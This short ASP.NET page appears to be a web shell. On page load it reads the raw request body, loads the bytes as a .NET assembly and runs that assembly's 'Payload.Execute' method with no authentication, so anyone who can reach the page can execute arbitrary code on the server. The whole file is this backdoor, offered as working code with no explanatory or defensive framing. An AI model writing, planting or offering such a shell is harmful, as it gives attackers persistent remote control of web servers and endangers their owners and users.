<%@ Page Language="C#" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.BinaryRead != null)
        {
            byte[] payload = Request.BinaryRead(Request.ContentLength);
            System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(payload);
            System.Type type = assembly.GetType("Payload");
            System.Reflection.MethodInfo method = type.GetMethod("Execute");
            method.Invoke(Activator.CreateInstance(type), null);
        }
    }
</script>